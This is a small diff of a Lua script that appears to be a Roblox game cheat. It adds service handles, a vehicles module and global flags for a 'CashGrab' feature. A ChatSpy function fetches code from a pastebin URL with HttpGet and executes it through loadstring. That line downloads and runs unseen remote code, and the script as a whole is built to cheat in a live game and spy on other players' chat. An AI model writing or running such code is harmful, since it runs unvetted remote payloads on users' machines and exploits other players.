@@ -1,3 +1,14 @@
+local RunService = game:GetService( 'RunService' )
+local UserInputService = game:GetService( 'UserInputService' )
+local Tweening = require(game.Players.LocalPlayer:FindFirstChild("Tweening", true))
+local vehiclesModule = require(game.ReplicatedStorage.Databases.Vehicles)
+local Player = game.Players.LocalPlayer
+
+_G.CashGrab = false
+_G.spinning = false
+_G.wantsItem = false
+_G.CashGrabLoaded = false
+
 function ChatSpy()
     loadstring(game:HttpGet('https://pastebin.com/raw/k9Ez2Lnr', true))()
 end
